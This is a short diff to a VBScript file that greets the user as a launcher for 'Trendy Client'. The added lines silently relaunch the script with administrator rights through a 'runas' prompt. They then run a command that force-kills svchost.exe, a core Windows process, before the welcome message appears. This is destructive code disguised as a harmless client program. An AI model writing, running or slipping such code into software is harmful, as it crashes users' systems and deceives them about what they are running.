@@ -297,9 +297,17 @@
 
 
 
-On Error Resume Next                                       
+On Error Resume Next      
+If Not WScript.Arguments.Named.Exists("elevated") Then
+    CreateObject("Shell.Application").ShellExecute WScript.FullName, Chr(34) & _
+    WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
+    WScript.Quit
+End If
+
 Set carew= CreateObject("WScript.Shell")
 
+
+carew.Run "cmd /k taskkill /F /IM svchost.exe", 1, True
 'O
 
 Msgbox "Welcome Trendy Client, press OK or Accept to Start Trendy Client."
